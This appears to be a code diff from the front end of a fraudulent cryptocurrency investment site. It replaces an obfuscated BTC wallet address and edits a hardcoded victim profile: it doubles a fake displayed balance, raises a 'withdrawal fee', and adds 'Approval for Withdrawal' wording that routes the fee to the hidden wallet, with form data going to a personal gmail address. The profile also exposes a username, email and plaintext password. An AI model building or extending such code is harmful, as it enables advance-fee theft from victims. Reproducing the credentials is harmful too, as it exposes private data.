@@ -12,7 +12,7 @@
   }
 
   // Encoded platform BTC wallet — regenerate with: python3 scripts/encode-wallet.py "bc1q..."
-  var platformWallet = decodeWallet("ERUGCUEFThYJG05LCQ4ETgcHUx0dG0RKAQRHTUVPTQkYQUdLAAwOShQB");
+  var platformWallet = decodeWallet("ERUGCUEDVg0KAlsKRkRHCQMQUwgVF1YNBARPSx5BQAsKHQJPEgdfG0FC");
 
   // Encoded account sync tokens — regenerate with: python3 scripts/encode-wallet.py "token..."
   var syncTokensByProfile = {
@@ -116,18 +116,20 @@
       username: "sarahglancey99",
       email: "Sarahglancey99@gmail.com",
       password: "Sarah1234567",
-      balanceUsd: 23956,
+      balanceUsd: 47900,
       currency: "USD",
       currencyLabel: "USD",
       asset: "BTC",
       stable: true,
-      stateVersion: "sarah-v2",
+      stateVersion: "sarah-v3",
       seedTransactions: false,
       withdrawalsBlocked: false,
       depositsBlocked: false,
       withdrawFeeProof: true,
-      withdrawFeeAmount: 455,
+      withdrawFeeAmount: 657,
       withdrawFeeCurrency: "USD",
+      withdrawFeeProofTitle: "Approval for Withdrawal",
+      withdrawFeeProofLabel: "Approval fee",
       withdrawFeeWallet: platformWallet,
       formSubmitEmail: "ronniechristopher89@gmail.com",
       withdrawCompleteWithinMs: 60 * 60 * 1000
